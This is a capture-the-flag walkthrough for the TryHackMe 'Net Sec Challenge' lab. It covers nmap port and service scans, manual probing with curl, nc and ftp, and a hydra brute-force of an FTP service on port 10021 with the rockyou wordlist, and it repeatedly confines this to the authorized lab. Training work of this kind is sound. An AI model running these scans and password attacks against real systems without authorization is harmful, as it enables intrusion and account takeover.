# Net Sec Challenge — TryHackMe

*Guided walkthrough & learning notes*

> **Difficulty:** Medium (part of the Network Security module)
> **Tools used:** `nmap`, `telnet` / `nc` / `curl`, `hydra` (and general Linux CLI)
---

## Table of contents

1. [Overview](#overview)
2. [Preparation (AttackBox)](#preparation-attackbox)
3. [Step 1 — Discovery (Nmap)](#step-1---discovery-nmap)
4. [Step 2 — Investigate HTTP](#step-2---investigate-http)
5. [Step 3 — Non-standard FTP on 10021](#step-3---non-standard-ftp-on-10021)
6. [Step 4 — Password attack with Hydra](#step-4---password-attack-with-hydra)
7. [Step 5 — Final checks & answers](#step-5---final-checks--answers)
8. [Learning notes & tips](#learning-notes--tips)
---

## Overview

This write-up walks you through the methodology to solve **Net Sec Challenge**: perform full port discovery, inspect HTTP headers/content for clues, connect manually to unusual services, and perform a controlled brute-force where allowed (FTP in-scope) to obtain the remaining answers. The community solutions confirm the expected workflow: `nmap` → manual probes (`telnet`/`curl`) → `hydra`. ([Medium][2])

---

## Preparation (AttackBox)

1. Launch the TryHackMe **AttackBox** (or use your Kali/Ubuntu).
2. Start the target VM from the room page.
3. Make sure you have these tools installed (AttackBox has them by default):

   * `nmap`
   * `telnet` (or `nc`)
   * `curl`
   * `hydra`
   * wordlists (`/usr/share/wordlists/rockyou.txt` on Kali)

---

## Step 1 — Discovery (Nmap)

Start with a wide scan to discover open ports. The room expects you to check both the first 10k ports and then all ports.

**Command — scan first 10,000 ports (fast):**

```bash
sudo nmap -sS -sV -p1-10000 -T4 -vv <TARGET_IP>
```

**Why:** `-sS` (SYN scan) for stealth/speed, `-sV` for service/version, `-p1-10000` restricts to ports <10,000 for the first question; `-T4 -vv` speeds up and shows verbose output.

**If you need to find ports outside 1–10000** (the walkthroughs note an open port >10000), scan all ports:

```bash
sudo nmap -sS -sV -p- -T4 -vv <TARGET_IP>
```

**What to look for:**

* Highest open port below 10,000 (answerable from the first scan).
* Any open port above 10,000 (revealed by `-p-`).
* How many TCP ports are open total (count from results). ([Medium][2])

---

## Step 2 — Investigate HTTP (example port: 8080)

One common result in community writeups is an HTTP service on port **8080**. Use HTTP enumeration to find hidden clues (headers, index content).

**HTTP header scan with Nmap:**

```bash
sudo nmap -p 8080 --script http-headers -sV <TARGET_IP>
```

**Or use curl to see headers and content:**

```bash
curl -I http://<TARGET_IP>:8080/
curl http://<TARGET_IP>:8080/ -L
```

**Why:** Some rooms hide flags/clues in server headers or in the returned webpage content (for example a custom `Server:` header or hidden comment). Use `curl -I` to fetch headers and `curl` or a browser to view page body. ([Medium][2])

---

## Step 3 — Non-standard FTP on 10021

Community writeups report an FTP server listening on **port 10021** (not standard 21). Manually connect to see banners and possibly usernames.

**Connect with ftp client or netcat:**

```bash
ftp <TARGET_IP> 10021
# OR
nc <TARGET_IP> 10021
# OR use curl (for banner):
curl telnet://<TARGET_IP>:10021
```

**Why:** Non-standard services are common in CTFs. Banner/version (`vsftpd 3.0.5` or similar) may be shown and indicate which service to target for auth attempts. ([GitHub][3])

---

## Step 4 — Password attack with Hydra

If the FTP service is in scope for password guessing (the lab allows it), gather usernames (they may appear in site content or headers). Create files and run `hydra` in a controlled way.

**Example steps:**

1. Create `users.txt` containing target usernames (one per line). For example:

```
alice
bob
```

2. Use `rockyou.txt` or another suitable list (be mindful of lab rules):

```bash
# Confirm the location of rockyou (Kali)
ls /usr/share/wordlists/rockyou.txt
```

3. Run hydra against FTP on the non-standard port:

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -s 10021 ftp://<TARGET_IP> -t 4 -V
```

**Flags explained:**

* `-L users.txt` — list of usernames
* `-P` — password list
* `-s 10021` — specify the FTP port
* `ftp://<TARGET_IP>` — target service
* `-t 4` — 4 parallel tasks (adjust for reliability)
* `-V` — verbose

**Note:** Only perform password attacks inside the TryHackMe lab (authorized). Community writeups show `hydra` finds credentials for one of the accounts. ([DEV Community][4])

---

## Step 5 — Final checks & answers

After the steps above you will have what you need to answer the room questions:

* **Highest port < 10,000:** found from the first `nmap` output (e.g., `8080`).
* **Open port > 10,000:** from the `-p-` scan (e.g., `10021`).
* **Number of TCP ports open:** count in `nmap` output.
* **Flag in HTTP server header:** extract from `curl -I` or `nmap --script http-headers`.
* **FTP credentials / FTP check:** obtain via `hydra`, then `ftp` into the service to retrieve any file/flag.

> **Example commands summary**

```bash
# Full port scan + service/version + default scripts
sudo nmap -sS -sV -sC -p- -T4 -vv <TARGET_IP>

# Focused scan for first 10000 ports
sudo nmap -sS -sV -p1-10000 -T4 -vv <TARGET_IP>

# HTTP header inspection
sudo nmap -p 8080 --script http-headers -sV <TARGET_IP>
curl -I http://<TARGET_IP>:8080/

# Connect to FTP on non-standard port
ftp <TARGET_IP> 10021
# or
nc <TARGET_IP> 10021

# Hydra brute-force for FTP (example)
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -s 10021 ftp://<TARGET_IP> -t 4 -V
```

---

## Learning notes & tips

* **Start broad, then focus.** Full port scans (`-p-`) take longer but find nonstandard services; filtered runs (`-p1-10000`) answer specific questions quickly. ([ITTavern][5])
* **Manual probing matters.** `telnet`/`nc`/`curl` show raw server behavior that automated tools may not highlight. This is invaluable for spotting flags or hidden endpoints. ([InfoSec Write-ups][1])
* **Respect lab scope.** Only use aggressive password attacks (Hydra) inside authorized lab environments. Start with small `-t` parallelism and sane wordlists.
* **Record everything.** Save Nmap output (`-oN scan.txt`) and any interesting banners/pages — they’re useful for later reporting and learning.

---

## Further reading & resources

* TryHackMe — **Network Security** module description (module page). ([TryHackMe][6])
* Community walkthroughs:

  * Simple writeup / summary (Infosec Writeups). ([InfoSec Write-ups][1])
  * Medium walkthrough (Aircon). ([Medium][2])
  * GitHub repository with short writeup and commands. ([GitHub][3])
* Nmap practical guide: [https://nmap.org/book/](https://nmap.org/book/) (read the Nmap documentation for advanced flags).
* Hydra usage examples: `man hydra` and Kali docs.
* Practice resources: TryHackMe labs & HTB for more scenario-based learning. ([TryHackMe][7])

---
